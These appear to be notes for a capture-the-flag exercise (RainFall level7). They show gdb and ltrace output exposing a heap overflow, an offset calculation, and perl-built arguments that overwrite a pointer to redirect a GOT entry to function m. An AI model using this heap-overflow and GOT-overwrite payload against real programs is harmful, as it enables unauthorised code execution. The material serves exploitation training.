```
(gdb) info function
All defined functions:
...
0x080484f4  m
0x08048521  main
```

```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%

level7@RainFall:~$ ltrace ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz ZZZZ
__libc_start_main(0x8048521, 3, 0xbffff714, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                      = 0x0804a008
malloc(8)                                                                                      = 0x0804a018
malloc(8)                                                                                      = 0x0804a028
malloc(8)                                                                                      = 0x0804a038
strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"...)                                      = 0x0804a018
strcpy(0x46464646, "ZZZZ" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

 ❯ python3 offset.py 46
20
```

"\x90" x 20 . "\x00\x84\x04\x08"
"\xf4\x84\x04\x08"

> ./level7 $(perl -e 'print "\x90" x 20 . "\x00\x84\x04\x08"') $(perl -e 'print "\xf4\x84\x04\x08"')


./level7 $(perl -e 'print "\x90" x 20 . "\x00\x84\x04\x08"') 42


./level7 $(perl -e 'print "\x90" x 20 . "\xe0\x27\xe9\xb7" . "\n"') $(perl -e 'print "\xf4\x84\x04\x08" . "\n"')